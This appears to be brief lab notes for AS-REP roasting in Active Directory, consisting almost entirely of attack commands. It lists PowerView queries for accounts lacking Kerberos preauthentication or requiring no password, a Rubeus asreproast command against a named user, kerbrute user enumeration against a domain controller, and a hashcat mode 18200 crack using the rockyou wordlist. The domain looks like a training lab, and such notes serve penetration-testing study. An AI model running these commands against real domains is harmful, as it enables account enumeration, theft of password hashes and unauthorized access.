
Finding Accounts with no preauth required via powerview

```powershell-session
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

Check for passwd_notreqd
```powershell-session
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

Attack with rubeus
```powershell-session
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

Attack with kerbrute
```shell-session
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

Crack Hash from attack offline
```shell-session
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```
